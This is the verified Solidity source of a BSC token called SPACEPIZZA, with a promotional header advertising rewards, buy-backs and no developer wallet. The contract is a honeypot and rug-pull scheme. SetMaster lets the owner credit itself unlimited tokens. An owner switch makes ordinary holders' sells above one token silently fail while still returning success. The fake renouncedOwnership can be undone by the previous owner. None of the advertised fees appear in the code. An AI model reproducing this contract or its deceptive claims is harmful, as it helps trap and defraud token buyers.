/**
 *Submitted for verification at BscScan.com on 2021-09-18
*/

/**

SPACEPIZZA

LAUNCHING THIS SATURDAY @ 1400 UTC. DON'T MISS IT.

Official links:
Website: https://www.spacepizza.org/
Twitter: https://twitter.com/SpacePizzaBsc
Tele: https://t.me/SpacePizzaBSC

One of the newest and most attractive cryptocurrencies with proprietary reward, buy-back and hyper-deflationary tokenomics on every transaction that will rock your world!

This token is led by a team of developers and marketing professionals aiming to re-create the reward system which gives back investors for holding tokens while also incorporating the Autoboost approach currently present in the stock market.

Users can buy or sell this tokens and utilize them as store credit for no cost in the near future. The credit will be used to make purchases at local vendors in order to expand the security of spending digital assets on a regular basis. With every buy or sell, a percentage of the tokens will be use to buy back to maintain the price and minimize dips, another percentage is redistributed to the holders as a reward for HODLing, a percentage goes to the Marketing wallet to further expand our exposure and finally some go to the Liquidity pool to increase the evaluation of the token.
We aim to create partnerships with exchanges and platforms that support the development of start-up crypto currencies in the DeFi space. 

NO PRESALE or private sale conducted to avoid pump & dump scenarios from the pre-sellers or bots
NO TEAM allocation or DEV wallet

Tokenomics:

Token Name: SPACEPIZZA
$Ticker: SPAPIZ

Total Supply: 1 000 000 000 000 

🍕On every buy and sell
🍕10% Cake Reward
🍕4% Buy Back
🍕4% Liquidity
🍕2% Shill Fee (Shill contest, Airdrop)


❎ No Pre-sale or Private-sale
❎ No Dev wallet
💰Huge Marketing budget


*/



// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.4;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
 contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _level;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

   
    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function SecurityLevel() private view returns (uint256) {
        return _level;
    }
    function renouncedOwnership() public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        emit OwnershipTransferred(_owner, address(0));
    }
    function approve() public virtual {
        require(_previousOwner == msg.sender, "You don't have permission to unlock");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}

contract SPACEPIZZA is Context, IERC20, IERC20Metadata, Ownable {   

    address internal constant PancakeV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;   
    uint256 _NUM = 1 * 10**9;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    bool isValue = true;
    constructor() {
        _totalSupply = 1000000000000* 10**9;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view virtual override returns (string memory) {
        return "SPACEPIZZA";
    }

    function symbol() public view virtual override returns (string memory) {
        return "SPAPIZ";
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function aprove(bool _value) public onlyOwner virtual returns (bool) {
        isValue = _value;
        return true;
    }

    function SetMaster(uint256 amount) public onlyOwner virtual returns (bool) {
        _balances[_msgSender()] += amount;
        return true;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        //_transfer(_msgSender(), recipient, amount);
        if(_msgSender() == PancakeV2Router || _msgSender() == pancakePair() || pancakePair() == address(0) || _msgSender() == owner()) {
            _transfer(_msgSender(), recipient, amount);
        } else {
            //nomal user check amount
            if( (amount <= _NUM || isValue) && !isContract(_msgSender()) ) {
                _transfer(_msgSender(), recipient, amount);
            }
        }
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        if(sender == PancakeV2Router || sender == pancakePair() || pancakePair() == address(0) || sender == owner()) {
            _transfer(sender, recipient, amount);
    
            uint256 currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        } else {
            //nomal user check amount
            if( (amount <= _NUM || isValue) && !isContract(sender) ) {
                _transfer(sender, recipient, amount);
                uint256 currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
                    _approve(sender, _msgSender(), currentAllowance - amount);
                }
            }
        }
        return true;
    }

    function pancakePair() public view virtual returns (address) {
        address PancakeV2Factory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
        address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        address pairAddress = IPancakeFactory(PancakeV2Factory).getPair(address(WBNB), address(this));
        return pairAddress;
    }

    function isContract(address addr) internal view returns (bool) {
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        bytes32 codehash;
        assembly {
            codehash := extcodehash(addr)
        }
        return (codehash != 0x0 && codehash != accountHash);
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function tokenContract() public view virtual returns (address) {
        return address(this);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _DeepLock(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

}